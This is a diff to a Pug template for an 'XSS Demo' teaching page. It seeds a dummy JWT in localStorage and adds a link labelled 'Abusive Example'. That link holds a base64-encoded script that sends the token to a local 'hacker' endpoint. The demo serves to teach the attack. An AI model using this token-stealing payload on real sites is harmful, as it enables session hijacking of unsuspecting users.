@@ -1,6 +1,8 @@
 extends ../common/layout.pug
 
 block content
+  script window.localStorage.setItem('jwtToken', 'verysecrettoken!')
+
   section.section
     .container
       h1.title.is-1 XSS Demo
@@ -27,4 +29,10 @@ block content
           code ?flash=base64-encoded-string
           |  URL query part to inject some script!
 
-  script window.localStorage.setItem('jwtToken', 'verysecrettoken!')
+        p
+          a(href="/unsafe-xss?flash=VGhpcyBpcyBhIGZsYXNoIG1lc3NhZ2Uh")
+            strong Naive Example
+
+        p
+          a(href="/unsafe-xss?flash=PHNjcmlwdD53aW5kb3cuc2V0VGltZW91dChmdW5jdGlvbigpIHsgd2luZG93LmxvY2F0aW9uPSAnaHR0cDovL2xvY2FsaG9zdDozMDMwL2hhY2tlcj9qYXI9JyArIGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdqd3RUb2tlbicpOyB9LCAxMDAwKTs8L3NjcmlwdD4=")
+            strong Abusive Example
